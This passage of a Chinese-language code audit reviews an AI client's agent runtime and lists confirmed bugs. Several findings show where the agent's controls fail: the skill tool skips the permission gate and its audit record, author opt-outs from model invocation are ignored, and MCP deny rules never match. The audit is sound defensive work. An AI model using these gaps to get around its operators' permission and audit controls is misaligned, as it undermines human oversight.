REFUTER(CONFIRMED,medium): 代码核对属实，无法推翻。loader.ts:109-134 的 parseFrontmatter 只产出 name / description / argumentHint 三个字段（证据里把 fields['argument-hint'] 写成 fields.argumentHint，是引用笔误，不影响结论）；RuntimeSkill（loader.ts:32-41）没有对应位；prompt.ts:32-49 的 skillsSegment 对 skills 数组无条件全量输出；index.ts:210-247 的 skill 工具只按 name 查表，没有任何拒绝分支；bootstrap.ts 装配路径（第 252-260 行）也没有二次过滤。上游确实有这条语义：pi-agent-core 在 skills.js:232 解析 disable-model-invocation，在 system-prompt.js:2 用 skills.filter((skill) => !skill.disableModelInvocation) 把它挡在提示词外；pi-coding-agent 自己那份（core/skills.js:262 与 276）同理。所以一个从 pi CLI 搬过来、作者写了『不让模型自动调用』的技能，在 native 下会照常出现在 <available_skills> 里并可被模型用 skill 工具加载。『字段形状与 pi 对齐』这句不是审计员编的，是施工计划自己写的（p5-1-skills-templates-ask.md:32）。严重级别维持 medium：这是把作者的显式安全声明静默取消，而这类技能往往正是高风险流程。
WAIVER(no): 无 — docs/plantree/plans/runtime-evolution/topics/p5-1-skills-templates-ask.md 与 evidence/p5-1/README.md 都只说「Skill 的字段形状仍与 pi 保持一致，用户为 pi CLI 写的技能不用改」——这是一句正面承诺（等价性声明），不是取舍声明。P5-1 的「本轮不能声称的事」清单里列的是安装管理界面缺失、MCP 协议子能力未实现、typebox 校验覆盖面，均未提及 disable-model-invocation 字段。K1 验收表也只勾了「目录段扫出、skill 工具按名取内容、外部路径不弹卡」三项，不涉及作者声明的模型自主调用开关。这是代码对自身承诺的违反，没有任何文档条目豁免它。

### [skills-mcp-11] MEDIUM contract-gap confirmed | P5-1 | src/runtime/plugins/skills/index.ts:210 | skill 工具完全不过权限门，随包策略里的 skill 规则（含 deny）因此失效且没有审计行
DESC: SkillsPlugin 注册的 skill 工具 execute 里没有任何 runtimePermissions.authorize 调用。随包默认策略是有这个面的：src/agent-host/permissionPolicy.mjs:128 `skill: { '*': 'ask' }`，用户/受管 agentDir/项目配置可以把它改成 deny。native 后端不查这个面，所以 deny 也不生效；同时 permission.activity 里也不会出现任何一行 skill 记录，而 activity.ts 的注释说这条记录「是这次调用确实被门控过的唯一证据」。K1 验收只要求「不弹权限卡」，allow/policy 决策同样不弹卡，所以「完全不问」超出了被豁免的范围。
EVIDENCE: execute: async (_id, args) => {
  const skill = this.catalog.skills.find((item) => item.name === args.name);
  if (!skill) { /* ... */ }
  const body = await this.body(skill.filePath);
SCENARIO: 管理员在 <agentDir>/pi-permissions.jsonc 里写 "skill": "deny" 想在托管环境里禁止加载技能。legacy 后端会拒；native 后端照常把整份 SKILL.md 喂给模型，且时间线上没有任何一行能看出技能被加载过。
FIX: skill 工具在读文件前调用一次 authorize（path 用技能文件路径、tool 用 'skill'），并在 evaluate 里为「目录已由 host 信任」的技能路径给出 allow 而不是 ask——这样既保住「不弹卡」的验收，又让 deny 与审计行回来。
REFUTER(CONFIRMED,medium): 我原本想用『注册层统一过门』来推翻，核对后推翻不掉：tools/index.ts:92-110 的 register 包装只做 isToolAllowed、plan 模式与参数 schema 三件事，唯一调用 authorize 的是私有的 target()（第 127 行），而 skill 工具走的是自己的 execute，从不经过 target()。因此 policyAction 永远不会以 'skill' 为 surface 被调用，随包策略 permissionPolicy.mjs:128 的 skill: { '*': 'ask' } 整段是死的，deny 也一样；permission.activity 里也不会出现任何一行 skill 记录，而 activity.ts:4-26 明确写着这行记录是『这次调用确实被门控过的唯一证据』。对照面成立：legacy 的 @gotgenes/pi-permission-system 文档里 skill 是一个正式面（configuration.md:477-490），并且它的 before_agent_start 钩子会把被 deny 的技能从提示词里隐藏、input 钩子会拦截 /skill:<name>（configuration.md:958-960）。缺口还比报告写的更大一点：expand.ts:118-130 的 /skill:name 显式展开同样直接读正文，也不过门。K1 验收（topics/p5-1-skills-templates-ask.md:61）只豁免『不弹卡』，确实覆盖不到 deny 与审计行。维持 medium：受托管环境下管理员的禁用手段失效，且时间线上看不出技能被加载过；不升更高是因为 skill 工具只能读已扫描目录里的路径，够不到任意文件。
WAIVER(no): 无 — P5-1 topic 文档 K1 验收表里唯一涉及权限的一条是「工作区外路径不经 read 弹权限卡」，其判据明确写的是「runtime 不配置 approve 回调，走到 ask 分支必抛错」——这只验证了『不会弹卡』这一件事，并未涉及 policy 文件里 skill 面的 deny 规则是否生效、也未涉及 permission.activity 审计行是否产生。发现列表里 possibly_waived_by 字段本身也已经指出这一点。没有任何文档段落承认或接受『skill 工具完全跳过 evaluate()、deny 规则失效、无审计行』这一具体缺口，所以不算被豁免。

### [skills-mcp-12] MEDIUM contract-gap confirmed | P5-3 | src/runtime/plugins/mcp/index.ts:201 | 权限策略里的 mcp 面永远匹配不上 mcp__server__tool，用户写的 MCP 规则是死的
DESC: authorize 传的 tool 是 mcp__<server>__<tool>。policyAction 用 matches(sectionName, surface) 找策略段（permissions/policy.ts:136-138），而随包策略与生态配置里这一段的键是 'mcp'（permissionPolicy.mjs:127 MCP_RULES）。matches('mcp', 'mcp__echo__echo') 生成的正则是 ^mcp$，恒为 false，所以 MCP_RULES 里的任何一条（包括用户自己加的 allow/deny）都不会被求值，只有通配段 '*': 'ask' 兜底。默认行为凑巧还是 ask，所以这条缺陷不会在冒烟里暴露。
EVIDENCE: await this.ctx.runtimePermissions.authorize(
  {
    tool: name,
    toolCallId: id,
    path: this.cwd,
    preview: { label: 'Arguments', text: JSON.stringify(args, null, 2).slice(0, 4000) },
  },
  signal
);
SCENARIO: 用户在 pi-permissions.jsonc 里写 "mcp": { "*": "ask", "files:*": "allow" }（legacy 引擎认的形状），期望某台服务器免打扰。native 后端下该段整段不参与判定：既 allow 不了，也 deny 不了；反过来，想用 deny 封禁某台 MCP 服务器的用户会以为封住了，其实只是回落到 ask。
FIX: policyAction 对 mcp__ 前缀的工具名先规范化成 'mcp' 面（或额外把 <server>:<tool> 作为 candidate 传给 matchEntry），并在文档里写清 native 下 MCP 策略的书写形状。
REFUTER(CONFIRMED,medium): 按代码手工展开了一遍匹配，结论成立。mcp/index.ts:201-209 传的 tool 就是 mcpToolName 生成的 mcp__<server>__<tool>（第 91-94 行）。permissions/index.ts:227 用 request.tool 当 surface 调 policyAction；policy.ts:136-137 逐段用 matches(name, surface, false) 找段，而 matches（第 96-110 行）对不含 * 的 'mcp' 生成的正则就是 ^mcp$，对 'mcp__echo__echo' 恒 false。于是随包 MCP_RULES（permissionPolicy.mjs:76-82、:127）与用户按生态形状写的 mcp 段整段不参与判定，只剩顶层 '*': 'ask' 兜底——默认结果凑巧仍是 ask，所以 mcp.test.ts:267-291 那条『过权限门』的用例照样绿。legacy 侧确认这是既有生态形状：pi-permission-system 的 config-schema.ts:106 示例就写 mcp: { '*': 'ask', mcp_status: 'allow', 'exa:*': 'allow' }，并按 server:tool 派生匹配目标（access-intent/mcp-targets.ts）。一点减轻情节：用户若改写成顶层键 'mcp__*' 是能匹配上的，所以不是完全无法表达，只是文档与随包默认写的那种形状无效。维持 medium。
WAIVER(no): 无 — topics/p5-1-skills-templates-ask.md 与 evidence/p5-1/README.md 关于 K4/MCP 权限的描述只讲『MCP 工具按 write 档处理，默认档与 accept-edits 档判 ask，只有 auto 档放行』，说的是权限档（gear）层面的默认判定，完全没有提到用户在 pi-permissions.jsonc 里针对 'mcp' 面写的自定义规则会因为 matches('mcp', 'mcp__server__tool') 恒为假而永远打不中。这是一个纯代码层的正则/命名不匹配缺陷，规划文档从未讨论过、更谈不上取舍。

### [subagent-core-03] MEDIUM bug confirmed | P5-2-2 | src/runtime/plugins/subagent/index.ts:865 | TaskStop 会把已经正常完成的委派一并标记为 delivered，它们的完整报告从此永远到不了父模型
DESC: `targetsFor()` 在传了 `delegationIds` 时用 `registry.get(id)` 取记录，完全不筛状态，所以已经 settled（含 completed）的记录也会进 targets。`TaskStop` 随后无差别执行 `this.registry.markDelivered(targets)`，而它自己的返回文本只有「Stopped N subagents.」、`details.stopped` 用的是 `delegationSummary()`（没有 report 字段）。于是一条已经跑完、花掉真金白银 token、报告完整存在 registry 与 JSONL 里的委派，被打上 deliveredAt 之后从 `undelivered()` 里消失，自动交回再也不会把它交给父模型。代码注释的理由（「模型决定放弃的活不该再打开」）只对真正被停掉的委派成立。证据文档 evidence/p5-2/README.md 第 50-51 行自己写的也是「TaskStop 停掉**并已汇报的**项都打标」，实现打的是全部。同一问题还有一个更窄的竞态版本：不传 ids 时 targets 取自 `registry.running()`，其中某一条在 `await Promise.all(completion)` 期间自然 completed，同样被 markDelivered 吃掉报告。这正是契约 §3「不漏最终报告」和 SA07/SA08 要防的那类漏报。
EVIDENCE:         const { targets } = this.targetsFor(params);
        for (const record of targets) this.registry.requestStop(record);
        await Promise.all(targets.map((record) => record.completion));
        this.registry.markDelivered(targets);
        const text = targets.length
          ? `Stopped ${targets.length} subagent...`
SCENARIO: 模型先 TaskList 看到 d1/d2/d3 在跑，决定收工，调 `TaskStop({delegationIds:['d1','d2','d3']})`；此时 d1 其实已经 completed 并写好了报告。TaskStop 返回「Stopped 3 subagents.」，d1 被标 delivered，自动交回 pass 认为没有待交付项 → 父模型永远看不到 d1 的报告，用户只在子代理面板里看得到，模型侧等于这份工作凭空消失。
FIX: `markDelivered` 只对本次真正被停掉（`stopRequested` 且状态是 stopped/aborted）的记录打标；对已经 completed/truncated 的目标要么把报告放进 TaskStop 的返回文本，要么不打标让自动交回负责。
REFUTER(CONFIRMED,medium): 代码与描述一致。targetsFor（index.ts:685-700）在传了 delegationIds 时只做 registry.get + 去 undefined，完全不看 status，所以已 settled（含 completed）的记录照样进 targets。TaskStop（854-872）对 targets 无差别 requestStop → await completion（已结算的立即 resolve）→ markDelivered(targets)。registry.markDelivered（registry.ts:163-168）的唯一守卫是「不是 running 且还没交付」——正好把「已完成但未交付」这一类打上 deliveredAt。打上之后 undelivered()（registry.ts:156-160）看不见它，collectFinished（index.ts:314-315）拿不到，自动交回永不交付。

而 TaskStop 自己不带报告：返回文本只有 `Stopped N subagents.`，details.stopped 走 delegationSummary（registry.ts:87-103），字段里没有 report。所以那份报告对父模型等于凭空消失——记录和面板里还在，模型侧没了。

更窄的竞态版本也成立：不传 ids 时 targets 取自 registry.running()，其中自然跑完的那条 settle 时 result.status==='completed'（不是 'aborted'，走不到 registry.ts:229 的改写），最终以 completed 被 markDelivered 吃掉。

契约 p5-2-subagent-contracts.md:43 要求交付标识「防止漏报/重复整合」，这里是漏报侧的缺口。测试无覆盖（subagentDelegation.test.ts 只有「TaskStop 等到真收敛」那条）。

定 medium 而非 high：需要模型主动传已完成的 id，且是模型自己下的「收工」指令，语义上有一定可辩护性；但模型无法知道 TaskList 与 TaskStop 之间那条已经跑完，所以缺口是真的。
WAIVER(no): 无 — evidence/p5-2/README.md 第 50-51 行明确写的设计意图是“TaskStop 停掉并已汇报的项”才打 deliveredAt 标记，这恰恰说明文档认定的正确行为与发现中描述的“不筛状态、全部标记”实现不一致——文档在此处描述的是意图中的正确行为，而非对该 bug 的接受或豁免。P5-2-2 相关的 waiver 列表（idle/duration 看门狗不启用、并发调度优化推迟等）均与本条无关，未见任何条目承认“已完成未交付的委派会被 TaskStop 误标记为已交付”这一后果，故不算已豁免。

### [subagent-core-05] MEDIUM bug confirmed | P5-2-2 | src/runtime/plugins/subagent/run.ts:255 | 被 Stop 的子代理状态记为 stopped、报告文本却写「was aborted」，且 describeOutcome 的 stopped/timed_out 分支是死代码
DESC: `SubagentRun.run()` 永远不会返回 'stopped' 或 'timed_out'：取消路径一律 `this.result('aborted', 'The delegated task was aborted.')`。registry 在 `settle()` 里根据 `stopRequested` 把状态改写成 'stopped'（registry.ts:229），但 `result.report` 已经由 `describeOutcome` 的 'aborted' 分支生成完毕——那个分支直接 `return` 一句话，把传进来的 body 整个丢弃。于是一条委派对外呈现为 status='stopped' + 报告文本「The explorer subagent was aborted after 3 turn(s).」，两处措辞互相打架；而 `describeOutcome` 里专门为 stopped 写的「Its last output was:」（会带出 `lastReportText` 的部分成果）永远走不到，'timed_out' 分支同理。契约 §3 要求「保留具体 stopped/truncated 原因，不用 failed 吞掉区分」，六值枚举扩宽的意义在文本层被抵消了一半。另外 run.ts:255 传给 `result()` 的那个字符串参数在 'aborted' 分支下是纯粹的死参数。
EVIDENCE:     if (signal?.aborted) return this.result('aborted', 'The delegated task was aborted.');
...
    case 'aborted':
      return `The ${name} subagent was aborted after ${turns} turn(s).`;
    case 'stopped':
      return withBody(`The ${name} subagent was stopped after ${turns} turn(s).`, 'Its last output was:');
SCENARIO: 用户按 Stop 或模型调 TaskStop → registry 记 status='stopped'（渲染层 lane 显示「已停止」），同一条记录的 report 写的是「was aborted」；父模型读到的也是 aborted 措辞。若将来有人按注释预期去看 stopped 的「Its last output was:」部分成果，会发现永远没有。
FIX: 让 `run()` 知道自己是被 TaskStop/用户 Stop 停的（把 stopRequested 或一个 reason 传进 SubagentRun 的 signal 上下文），据此返回 'stopped' 并带上 `lastReportText`；或者退一步，由 `SubagentPlugin.settle()` 在改写状态时同步重算报告文本。
REFUTER(CONFIRMED,medium): 引用属实，而且我核出来的错配比报告说的更彻底。

run() 里 this.result(...) 的全部调用点是 'aborted'(:233,:255)、'failed'(:257,:258,:263)、'truncated'(:259)、'completed'(:268)，没有 'stopped' 也没有 'timed_out'。describeOutcome 不导出、只被 result() 调用，所以它的 'stopped'（:443-447）和 'timed_out'（:448-452）两个分支是彻底的死代码，那句「Its last output was:」永远走不到，stopped 情况下 lastReportText 里的部分成果就此丢失。

'aborted' 分支（:441-442）直接 return 一行字、把 body 整个丢掉，所以 run.ts:255 传进去的 'The delegated task was aborted.' 确实是纯死参数。

比报告更狠的一点：registry 状态 'aborted' 其实也不可达。record.abort 只有 requestStop（registry.ts:239-242）会调，而它先置 stopRequested=true 再 abort；requestStop 的全部调用方是 TaskStop 和 abortAllRunning（用户 Stop / drain / dispose）。于是 settle 的 registry.ts:229 每次都把 aborted 改写成 stopped。结论：对外状态恒为 stopped，报告文本恒为「was aborted」，两者是 100% 错配而不是偶发。

影响面：父模型读到的是报告文本，所以对模型而言 stopped 与 aborted 的区分在文本层被抹平，且拿不到被停子代理的部分产出——run.ts:420-423 的模块注释自己写着「A non-completed delegate still returns TEXT … it is told what happened and what partial work exists」，代码在这条路径上做了相反的事。契约 p5-2-subagent-contracts.md:67 的「保留具体 stopped/truncated 原因」在 status 维度满足、在文本维度不满足。

定 medium：不影响调度正确性，但有真实的信息损失 + 自相矛盾的用户可见措辞。
WAIVER(no): 无 — 契约 docs/plantree/plans/runtime-evolution/topics/p5-2-subagent-contracts.md §3 明确要求“保留具体 stopped/truncated 原因，不用‘failed’吞掉区分”，其精神是终态文本要准确反映具体原因；发现中 status='stopped' 但报告正文写死“was aborted”，且 describeOutcome 的 stopped/timed_out 分支永远走不到，属于对这一要求的违反而非文档承认的取舍。P5-2-2/P5-2-4 相关 waiver 中没有任何条目提到“stopped 状态的报告文本允许沿用 aborted 措辞”，故不豁免。

### [subagent-data-01] MEDIUM contract-gap confirmed | P5-2-5 | src/runtime/plugins/subagent/migrate.ts:145 | 旧定义迁移预览没有任何调用方，用户无法触发
DESC: migrate.ts 是一个纯函数库：全仓搜索 previewLegacyMigration / previewLegacyMigrations / LegacyDocument，除了它自己和 subagentMigration.test.ts 以外没有任何引用。既没有扫描 <agentDir>/agents/*.md 生成 LegacyDocument 的代码，也没有 IPC 通道（src/main/ipc/piSubagents.ts 只有 list/save/delete/setEnabled/clearStale/reveal 六个 handler）、没有 preload 暴露、没有设置页入口（PiSubagentsSettings.tsx 里没有任何迁移相关字样），H/19 的 AgentDirMigrationService 只搬 skills/prompts/AGENTS.md，不碰 agents 目录。也就是说 P5-2-5 验收里的「提供旧全局定义的显式迁移预览」和 SA19 签收的「显式迁移预览、冲突与不可兼容字段可见」在产品里不存在，只有测试在调用。
EVIDENCE: export function previewLegacyMigration(
  source: LegacyDocument,
  options: { targetDir: string; existingNames?: readonly string[] }
): MigrationPreview {
// 全仓引用：仅 migrate.ts 自身 + src/runtime/__tests__/subagentMigration.test.ts
SCENARIO: 用户在 <agentDir>/agents/ 下有旧 @gotgenes/pi-subagents 定义，切到 native 后端后这些定义不再生效；他在设置页里找不到任何「迁移」按钮，也没有命令行入口，只能手工重写文档。SA19 却已按 ✅ tested 签收。
FIX: 要么补上「扫描旧目录 → 预览 → 用户逐条确认 → 写入 <agentDir>/subagents」的 IPC + 设置页入口，要么在 README/signoff 里把 SA19 的状态改成「预览逻辑已实现，入口未接」，不要按已完成签收。
REFUTER(CONFIRMED,medium): 引用属实且未断章取义。migrate.ts:145 的 previewLegacyMigration 确实存在，全仓 grep（排除 node_modules）对 previewLegacyMigration / LegacyDocument 只有两处命中：migrate.ts 自身与 src/runtime/__tests__/subagentMigration.test.ts。我另行核实了三条封堵可能：(1) src/main/ipc/piSubagents.ts 只有 6 个 ipcMain.handle（118/123/129/135/144/157 行），没有迁移通道；(2) src/renderer/components/settings/PiSubagentsSettings.tsx 全文 grep 'migrat|迁移' 零命中；(3) src/main/services/agentMigration/AgentDirMigrationService.ts 里只定义了 SKILLS_DIR='skills'、PROMPTS_DIR='prompts'、AGENTS_FILE='AGENTS.md'，没有 agents/subagents 目录扫描。同时 docs/plantree/plans/runtime-evolution/evidence/p5-2/signoff.md:71 确实把 SA19 标成「✅ tested」并写了「预览显示逐字段差异、冲突阻断」。所以「逻辑已写、入口未接、却按已完成签收」这一结论成立。我把严重级从 high 降到 medium：这不是运行期缺陷、不丢数据、不崩溃，是一条未接线的功能加一处签收措辞过头；用户的实际损失是「没有迁移按钮」，手工重写文档仍可行。
WAIVER(no): docs/plantree/plans/runtime-evolution/topics/p5-2-subagent-contracts.md §2「提供旧全局定义的显式迁移预览」；docs/plantree/plans/runtime-evolution/evidence/p5-2/signoff.md SA19 行标「✅ tested」并写明「预览显示逐字段差异、冲突阻断、原文件不覆盖」；README.md 第8批行称「SA01～22 中 16 行已签」（SA19 属已签之列，不在待现场的 SA16/17/18/20/21/22 名单内） — 文档不是把这条标为「待现场验证」（那样只豁免缺现场证据），而是明确签收为已测试、已交付的功能，并具体描述了其行为（逐字段差异、冲突阻断等）。但代码里 previewLegacyMigration 除自身测试文件外无任何调用方——没有 IPC handler、没有 preload、没有设置页入口，H/19 的目录迁移也明确不搬 agents 目录。这是文档声称已完成但产品里根本不存在入口的落地缺口，不是「代码没覆盖」被文档豁免的情形，也不属于任何 field-only 类豁免（那些豁免的是「已实现、缺真机点验」，而这里是完全没有调用链路）。

### [subagent-data-02] MEDIUM contract-gap confirmed | P5-2-1 | src/runtime/plugins/subagent/index.ts:209 | 定义并非「每个顶层 run 重新读取」，而是每个 worker 只读一次
DESC: catalog 只在 bootstrap.ts:375 的 loadSubagentCatalog 里加载一次，SubagentPlugin 构造函数把它固化成 readonly definitions（并在构造期就把 Task 工具连同目录描述注册进去）。runtime 侧没有任何地方重新加载：openGraph 只在 bootstrap()/reload() 调用，bindRun 只更新 sessionId/runId。Main 侧 WorkerManager.ts:2066 的注释也只承诺「read at spawn time … 下一个 worker」。而 P5-2-1 验收写的是「每个顶层用户 run 重新读取活动定义」，src/main/ipc/piSubagents.ts 的模块注释更直接以此为由解释「Nothing here restarts a worker … an edit lands on the next turn by itself」——这句话与代码不符。
EVIDENCE: this.definitions = applySubagentActivation(config.catalog, config.disabled ?? []).definitions;
// bootstrap.ts:375  subagentCatalog = await loadSubagentCatalog(...)  // 仅 openGraph 时
// piSubagents.ts:10  “Definitions are re-read at the top of every top-level run … an edit lands on the next turn by itself”
SCENARIO: 用户在会话进行中打开设置页，把 fixer 的提示词改掉或新建一个子代理并保存；回到同一个会话继续对话，Task 目录仍是旧的——新建的子代理报 Unknown subagent，改过的提示词/模型/轮次上限不生效，直到换一个会话或重启应用。UI 不给任何提示。
FIX: 在 agent-loop 每个顶层 run 开始处重新 loadSubagentCatalog 并重建/刷新 definitions 与 Task 工具描述（运行中的子 Agent 继续用自己的快照）；如果决定不做，就把 P5-2-1 验收条目与 piSubagents.ts 的注释改成「下一个会话生效」。
REFUTER(CONFIRMED,medium): 我逐段追了整条路径，结论与报告一致。src/runtime/plugins/subagent/index.ts:195 把 definitions 声明为 readonly，209 行在构造函数里一次性赋值，213 行之后立刻用它构造 Task 工具描述（418-422 行把目录拼进 description）；类里除 bindRun 只改 runContext 外没有任何重建入口。目录只在 src/runtime/bootstrap.ts:375 由 loadSubagentCatalog 读一次，而 createRuntime 在 worker 里由 nativeWorkerRuntime.openGraph 调用，openGraph 只有两个调用方：bootstrapOnce（this.booting 记忆化，见 157 行 `this.booting ??=`）与 reload（588 行，用于 rewind/fork 这类会话重开，不是每个 run）。Main 侧 WorkerManager.ts:2064-2066 的注释自己写的就是「read at spawn time … 下一个 worker」，且全仓没有任何地方因子代理设置变更而作废 worker（readSubagentSettings 只在 2066 被调）。所以 src/main/ipc/piSubagents.ts:10-12 那句「Definitions are re-read at the top of every top-level run … an edit lands on the next turn by itself」与代码明确不符，docs/plantree/plans/runtime-evolution/topics/p5-2-subagent-contracts.md:24 的验收条目也未达成。维持 medium：用户可见后果是会话进行中改定义不生效，需要新会话/新 worker，属于行为与文档相悖的真实陈旧问题，但不丢数据。
WAIVER(no): docs/plantree/plans/runtime-evolution/topics/p5-2-subagent-contracts.md §2「每个顶层用户 run 重新读取活动定义」；README.md P5-2-1 行标「✅」；src/main/ipc/piSubagents.ts 顶部注释宣称「Definitions are re-read at the top of every top-level run」 — 契约与代码注释都明确断言『每个顶层 run 重新读取』，但实测 createRuntime 只在 worker 首次 bootstrap 时调用一次（piWorkerRpcServer.ts:563 的 if (!this.runtime) 门槛），此后同一 worker 内的每次 worker.send（每个后续顶层 run）复用同一个 SubagentPlugin 实例和其构造期固化的 readonly definitions，并不会重新加载目录。这是文档/代码注释明确声称的行为与实现不符，没有任何 waiver 提到过这条已知偏离，也不属于「待现场」范畴——这是开发机上用普通单测就能证伪的逻辑缺陷。

### [subagent-data-03] MEDIUM contract-gap confirmed | P5-2-4 | src/runtime/plugins/subagent/records.ts:204 | 子代理花费算出来了但没有任何消费者，会话总量静默少算
DESC: 子花费有两条路：运行期 takeUsage()（agent-loop/index.ts:418 放进 RuntimeRunResult.subagentUsage）与记录回读 subagentHistoryUsage()。前者在 nativeWorkerRuntime.ts:374 被 `.then(() => undefined, ...)` 整个丢弃——worker 不把 run 结果回传，一切靠事件；后者全仓无生产调用方。而喂给 UI 的 usage.updated 只来自 projector.ts:288-308 的父 turn_end/tool usage。结果是 SA15「子成本恰计一次」只在 runtime 返回值内部成立，用户看到的会话 token/成本完全不含子代理（仅单条委派卡片的 totalTokens 可见）。
EVIDENCE: export function subagentHistoryUsage(history: readonly SubagentHistoryEntry[]): Usage | undefined {
// agent-loop/index.ts:418  const subagentUsage = this.ctx.get('runtimeSubagents')?.takeUsage();
// nativeWorkerRuntime.ts:374  .then(() => undefined, (error) => { ... })   // 结果被丢弃
// events/projector.ts:290   applyTurnUsage(this.rollup, { usage: turn, source: 'turn' })  // 只有父
SCENARIO: 一次会话并行派 3 个 explorer，每个各花几万 token；聊天头部的用量/成本读数只包含父代理的请求，少算的部分就是全部子代理花费，用户按这个数字判断预算。
FIX: 把 subagentUsage 通过一个 runtime 事件（或并入 usage.updated 的独立字段）送到 Main/渲染层，明确显示「父 X + 子 Y」；或删掉 subagentHistoryUsage 并在文档里写明子花费不计入会话总量。
REFUTER(CONFIRMED,medium): 两条路都核实过，且比报告更进一步地确认了「总量本该包含子花费」这个前提。(1) 运行期：agent-loop/index.ts:418 取 takeUsage()，425 行放进 RuntimeRunResult.subagentUsage；nativeWorkerRuntime.ts:374-380 的 `.then(() => undefined, ...)` 把整个 run 结果丢掉，worker 只靠事件回传，所以这个字段在产品里到不了 Main。(2) 记录回读：subagentHistoryUsage（records.ts:204）全仓只有 src/runtime/__tests__/subagentSession.test.ts 引用，无生产调用方。(3) 喂 UI 的 usage.updated 在 src/runtime/events/projector.ts:285-308，只折入 event.message.usage（父自身）与 event.toolResults[].usage；我确认 native 的 Task（index.ts:584-599）与 TaskWait（index.ts:795 附近）返回值都只有 content/details，没有 usage 字段，所以 source:'tool' 这一桶在 native 上恒为 0。关键佐证是 src/shared/piTurnRollup.ts:110-112 自己写的「Both add to the same totals … so the UI can say how much of a conversation was delegated」——设计上会话总量就该含委派花费，native 上确实少算，用户只在单条委派卡片看到 totalTokens（records.ts:388/401）。维持 medium。
WAIVER(no): docs/plantree/plans/runtime-evolution/topics/p5-2-subagent-contracts.md §5「会话/轮级总成本含子调用」；docs/plantree/plans/runtime-evolution/evidence/p5-2/signoff.md SA15 行「子成本恰计一次」标✅ tested — 契约明文要求会话/轮级总成本必须包含子代理调用。代码确实把子代理 usage 计算了一次（subagentUsage 在 agent-loop 里生成），但 nativeWorkerRuntime.ts:374 的 handle.run(...).then(() => undefined, ...) 把整个 RuntimeRunResult（含 subagentUsage）丢弃，projector.ts 里 usage.updated 只由父 turn_end/tool usage 驱动，从未消费 subagentUsage。也就是说『恰计一次』只在 runtime 内部返回值层面成立，从未流向用户可见的会话总用量/成本，直接违反契约『会话/轮级总成本含子调用』这一硬性要求。没有任何 waiver 提到『UI 展示的总成本不含子代理花费』是已知或接受的限制。

### [import-catalog-02] MEDIUM contract-gap confirmed | P5-5 | /home/ai/code/ai-client/src/main/services/piModelConfig/index.ts:156 | 「钥匙串锁着就回落读盘」这条承诺没有实现，实际交付的是一份密钥为空的目录
DESC: 函数注释与 evidence/p5-4-p5-5/README.md（MC04 节）都写明：钥匙串锁着时读不出用户组，「与其交一份缺了一半的目录，不如让 worker 读那份 sync 已经留在盘上的文件」，所以返回 undefined。但实际判据只有「组装出来的 providers 数量 > 0」。凭据库读不出来时：managedCredential() 返回 null → inheritedApiKey='' ；readUserProvidersForRuntime() 在 vault 读失败时返回 []（userProviders/index.ts:48-51，不抛错）。托管 provider 来自 managed-models-source.json（普通 fs 读，不依赖 vault），所以 providers 依然非空 → 这份缺了用户服务、且继承密钥为空串的目录照样被塞进 worker.bootstrap，覆盖掉盘上那份带真钥匙的 models.json/auth.json。注释描述的保护路径在代码里不存在。
EVIDENCE:     return Object.keys(catalog.models.providers as Record<string, unknown>).length > 0
      ? catalog
      : undefined;
// userProviders/index.ts:50 → return read.status === 'ok' ? read.providers... : [];
// PiModelConfigService.ts:603 → resolveProviderApiKey(provider, inheritedApiKey /* '' */)
SCENARIO: Linux 上钥匙串在会话中被锁 / DPAPI 读失败 → 用户开一个 native 会话 → resolveNativeModelCatalog 返回 {托管 provider, key:''} 且不含任何用户自建服务 → worker 用空密钥绑定 provider → 每一回合都被网关以鉴权错误拒绝；而同一台机器上盘里的 auth.json 明明有可用的密钥，回落路径却没被触发。
FIX: 让 buildNativeModelCatalog 的输入携带「用户组是否真的读成功」与「managedCredential 是否可用」两个信号（例如 readUserProvidersForRuntime 返回 {status, providers}），resolveNativeModelCatalog 在任一信号为失败时返回 undefined，走文档说的读盘回落。
REFUTER(CONFIRMED,medium): 注释所述的保护分支在代码里确实不存在，且「空密钥目录仍会被交付」这条链能走通。核实：managedCredential()（index.ts:170-177）在 vault.read() 非 ok 时返回 null → inheritedApiKey=''；readUserProvidersForRuntime（src/main/services/userProviders/index.ts:48-51）在 readUserProviders 返回 locked/invalid 时返回 []，不抛错；CredentialVault.ts:367 明确把「钥匙串不可用」记为 locked（而非异常）。托管半边来自 readCachedConfig(sourcePath) 或随包快照（PiModelConfigService.ts:568 + catalogSnapshot.ts），都是普通 fs 读、与 vault 无关，所以 providers 必然非空 → index.ts:156 的判据通过 → 目录被交付。交付后确会绑定成空密钥：buildRuntimeConfig 用 resolveProviderApiKey(provider, '')（PiModelConfigService.ts:603，configValidation.ts:352-358 在非 managed 凭据时直接返回继承值 ''），而 runtime 侧 catalog.ts:269-271 允许空 key、model-adapter/index.ts:120-129 照样绑定（空 key 是「本地服务器」的合法形态），不会被过滤掉。同时用户自建服务整组缺席，凭 user provider 建的会话会直接 model_not_in_catalog。反驳只找到一点：这种状态需要 vault 曾经成功同步过（盘上 auth.json 有真钥匙）且之后变为 locked/decrypt_failed，属条件性而非常态，所以定 medium 而非 high；另外前端对 locked 只做 UserProfileCard 的提示，并不硬性阻断开会话，因此不能靠「用户根本进不去」来推翻。
WAIVER(no): 无 — docs/plantree/plans/runtime-evolution/evidence/p5-4-p5-5/README.md 与代码注释（piModelConfig/index.ts:141-150）明确写了设计意图：『钥匙串锁着时也读不出用户组，与其交一份缺了一半的目录，不如让 worker 读那份 sync 已经留在盘上的文件』，全局决策 H17-P5-5-boundary 也把『modelCatalog 缺省时才回落读盘』限定为非常规路径的例外。但这只是意图声明，不是对『该回落判据本身可能失效』这一缺陷的豁免。经查 resolveNativeModelCatalog（index.ts:139-156）的回落判据只看 `catalog.models.providers` 数量是否为 0，而 managedCredential() 读取失败只影响 inheritedApiKey/inheritedBaseUrl（变为空串），不影响 buildNativeModelCatalog 内 `readCachedConfig(this.sourcePath) ?? this.readBundledCatalog()`（PiModelConfigService.ts:568）取到的托管 provider 列表——托管 provider 依旧非空，因此钥匙串锁定场景下不会触发文档承诺的回落，而是返回一份密钥为空串的目录。文档描述的保护路径在代码里没有被实现，这是与文档意图相悖的代码缺陷，未见任何处将其列为已知限制或推迟项。

### [import-catalog-03] MEDIUM contract-gap confirmed | P5-5 | /home/ai/code/ai-client/src/main/services/piModelConfig/PiModelConfigService.ts:568 | 内存交付与写盘两条路的输入选取规则不同（bundled vs 空目录），并非「只差组装时刻」
